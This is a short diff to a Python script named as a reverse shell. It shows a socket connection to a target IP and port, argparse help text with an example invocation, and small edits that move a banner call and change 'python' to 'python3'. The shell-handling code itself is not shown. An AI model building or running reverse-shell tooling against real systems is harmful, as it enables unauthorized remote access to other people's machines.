@@ -15,8 +15,6 @@ def show_banner():
     print(banner, flush=True)
 
 def main(target_ip, target_port):
-    show_banner()
-    
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target_ip, target_port))
     
@@ -54,11 +52,13 @@ def main(target_ip, target_port):
     s.close()
 
 if __name__ == "__main__":
+    show_banner()
+    
     parser = argparse.ArgumentParser(
         description="Reverse Shell Script",
         epilog="""
 Example usage:
-  python reverse_shell.py 192.168.1.100 4444
+  python3 reverse_shell.py 192.168.1.100 4444
 
 This will connect to the target machine at 192.168.1.100 on port 4444.
 """,
@@ -68,5 +68,4 @@ This will connect to the target machine at 192.168.1.100 on port 4444.
     parser.add_argument("target_port", type=int, help="Target Port")
     args = parser.parse_args()
     
-    show_banner()
     main(args.target_ip, args.target_port)
